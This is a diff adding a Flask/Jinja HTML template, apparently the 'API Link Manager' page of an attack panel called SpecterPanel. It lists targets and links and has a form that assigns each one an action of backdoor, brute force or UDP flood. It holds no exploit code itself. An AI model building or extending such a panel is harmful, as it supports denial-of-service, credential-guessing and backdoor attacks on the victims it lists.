@@ -1,48 +1,143 @@
-<div class="card">
-                  <div class="card-body">
-                    <h4 class="card-title">To do list</h4>
-                    <div class="add-items d-flex">
-                      <input type="text" class="form-control todo-list-input" placeholder="enter task..">
-                      <button class="add btn btn-primary todo-list-add-btn">Add</button>
-                    </div>
-                    <div class="list-wrapper">
-                      <ul class="d-flex flex-column-reverse text-white todo-list todo-list-custom">
-                        <li>
-                          <div class="form-check form-check-primary">
-                            <label class="form-check-label">
-                              <input class="checkbox" type="checkbox"> Create invoice </label>
-                          </div>
-                          <i class="remove mdi mdi-close-box"></i>
-                        </li>
-                        <li>
-                          <div class="form-check form-check-primary">
-                            <label class="form-check-label">
-                              <input class="checkbox" type="checkbox"> Meeting with Alita </label>
-                          </div>
-                          <i class="remove mdi mdi-close-box"></i>
-                        </li>
-                        <li class="completed">
-                          <div class="form-check form-check-primary">
-                            <label class="form-check-label">
-                              <input class="checkbox" type="checkbox" checked> Prepare for presentation </label>
-                          </div>
-                          <i class="remove mdi mdi-close-box"></i>
-                        </li>
-                        <li>
-                          <div class="form-check form-check-primary">
-                            <label class="form-check-label">
-                              <input class="checkbox" type="checkbox"> Plan weekend outing </label>
-                          </div>
-                          <i class="remove mdi mdi-close-box"></i>
-                        </li>
-                        <li>
-                          <div class="form-check form-check-primary">
-                            <label class="form-check-label">
-                              <input class="checkbox" type="checkbox"> Pick up kids from school </label>
-                          </div>
-                          <i class="remove mdi mdi-close-box"></i>
-                        </li>
-                      </ul>
-                    </div>
-                  </div>
-                </div>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>API Links - SpecterPanel</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+  <!-- Libraries -->
+  <link rel="stylesheet" href="{{ url_for('static', filename='assets/vendors/mdi/css/materialdesignicons.min.css') }}">
+  <link rel="stylesheet" href="{{ url_for('static', filename='assets/vendors/css/vendor.bundle.base.css') }}">
+  <link rel="stylesheet" href="{{ url_for('static', filename='assets/css/style.css') }}">
+
+  <style>
+    body {
+      background-color: #0d1117;
+      color: #f0f6fc;
+      font-family: 'Segoe UI', sans-serif;
+    }
+    .page-title {
+      color: #58a6ff;
+      margin: 30px 0 20px;
+    }
+    .card-custom {
+      background-color: #161b22;
+      color: #f0f6fc;
+      border-radius: 12px;
+      padding: 20px;
+      margin-bottom: 20px;
+    }
+    .table th, .table td {
+      color: #f0f6fc;
+    }
+    .badge-action {
+      font-size: 12px;
+      padding: 4px 8px;
+      border-radius: 4px;
+    }
+    .backdoor { background-color: #00ffd5; color: #0d1117; }
+    .brute { background-color: #ff7b00; color: #fff; }
+    .flood { background-color: #f85149; color: #fff; }
+    #api-form { display: none; }
+  </style>
+</head>
+<body>
+<div class="container mt-4">
+  <h2 class="page-title">API Link Manager</h2>
+
+  <!-- Table -->
+  <div class="card-custom">
+    <h4 class="mb-3">Stored API Links</h4>
+    <div class="table-responsive">
+      <table class="table table-hover">
+        <thead>
+          <tr>
+            <th>ID</th>
+            <th>Email</th>
+            <th>Target</th>
+            <th>Link</th>
+            <th>Type</th>
+            <th>Condition</th>
+            <th>Actions</th>
+          </tr>
+        </thead>
+        <tbody>
+          {% if links %}
+            {% for l in links %}
+            <tr>
+              <td>{{ l.ID }}</td>
+              <td>{{ l.email }}</td>
+              <td>{{ l.target_name }}</td>
+              <td>{{ l.link }}</td>
+              <td>
+                <span class="badge badge-action 
+                  {% if l.action_type == 'backdoor' %}backdoor
+                  {% elif l.action_type == 'brute_force' %}brute
+                  {% else %}flood
+                  {% endif %}">
+                  {{ l.action_type }}
+                </span>
+              </td>
+              <td>{{ l.condition }}</td>
+              <td>
+                <a href="{{ url_for('delete_api_link', id=l.ID) }}" class="btn btn-sm btn-danger">
+                  <i class="mdi mdi-delete"></i>
+                </a>
+              </td>
+            </tr>
+            {% endfor %}
+          {% else %}
+            <tr>
+              <td colspan="7" class="text-center text-muted">No API links stored.</td>
+            </tr>
+          {% endif %}
+        </tbody>
+      </table>
+    </div>
+
+    <button id="show-form" class="btn btn-outline-info mt-3">
+      <i class="mdi mdi-plus-circle-outline"></i> Add API Link
+    </button>
+  </div>
+
+  <!-- Hidden Add Link Form -->
+  <div class="card-custom" id="api-form">
+    <form method="POST" action="{{ url_for('add_api_link') }}">
+      <div class="row">
+        <div class="col-md-3">
+          <label>Email</label>
+          <input name="email" class="form-control" required>
+        </div>
+        <div class="col-md-3">
+          <label>Target Name</label>
+          <input name="target_name" class="form-control" required>
+        </div>
+        <div class="col-md-3">
+          <label>Link</label>
+          <input name="link" class="form-control" required>
+        </div>
+        <div class="col-md-3">
+          <label>Action Type</label>
+          <select name="action_type" class="form-control" required>
+            <option value="backdoor">Backdoor</option>
+            <option value="brute_force">Brute Force</option>
+            <option value="udp_flood">UDP Flood</option>
+          </select>
+        </div>
+        <div class="col-md-3 mt-4">
+          <button type="submit" class="btn btn-success mt-2">Save</button>
+        </div>
+      </div>
+    </form>
+  </div>
+</div>
+<!-- Scripts -->
+<script src="{{ url_for('static', filename='assets/vendors/js/vendor.bundle.base.js') }}"></script>
+<script>
+  document.getElementById('show-form').addEventListener('click', () => {
+    const form = document.getElementById('api-form');
+    form.style.display = form.style.display === 'none' ? 'block' : 'none';
+  });
+</script>
+</body>
+</html>
